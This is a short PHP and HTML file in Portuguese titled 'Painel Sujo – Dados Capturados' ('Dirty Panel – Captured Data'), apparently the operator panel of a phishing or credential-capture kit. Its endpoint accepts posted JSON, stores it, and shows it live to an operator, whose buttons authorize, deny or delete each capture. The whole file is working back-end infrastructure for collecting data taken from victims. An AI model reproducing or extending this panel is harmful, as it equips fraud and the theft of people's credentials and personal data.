<?php
session_start();

$arquivo = 'dados.json';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents("php://input"), true);
    file_put_contents($arquivo, json_encode($data));
    echo json_encode(['status' => 'salvo']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_GET['action']) && $_GET['action'] === 'get') {
        echo file_get_contents($arquivo);
        exit;
    }

    if (isset($_GET['action']) && $_GET['action'] === 'status') {
        $dados = json_decode(file_get_contents($arquivo), true);
        echo json_encode(['status' => $dados['status'] ?? 'pendente']);
        exit;
    }

    if (isset($_GET['action']) && $_GET['action'] === 'set') {
        $status = $_GET['status'] ?? 'pendente';
        $dados = json_decode(file_get_contents($arquivo), true);
        $dados['status'] = $status;
        file_put_contents($arquivo, json_encode($dados));
        echo json_encode(['status' => $status]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
  <title>Painel consulta</title>
  <style>
    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
    button { margin: 5px; padding: 10px; }
    .box { background: #222; padding: 20px; border: 1px solid #0f0; }
  </style>
</head>
<body>
  <h2>Painel Sujo – Dados Capturados</h2>
  <div class="box" id="dados">Carregando...</div>
  <button onclick="setStatus('autorizado')">Autorizar</button>
  <button onclick="setStatus('negado')">Negar</button>
  <button onclick="setStatus('excluir')">Excluir</button>

  <script>
    async function carregar() {
      let r = await fetch('api.php?action=get');
      let j = await r.json();
      document.getElementById('dados').innerText = JSON.stringify(j, null, 2);
    }

    async function setStatus(s) {
      await fetch('api.php?action=set&status=' + s);
      alert('Status definido: ' + s);
    }

    setInterval(carregar, 2000);
    carregar();
  </script>
</body>
</html>
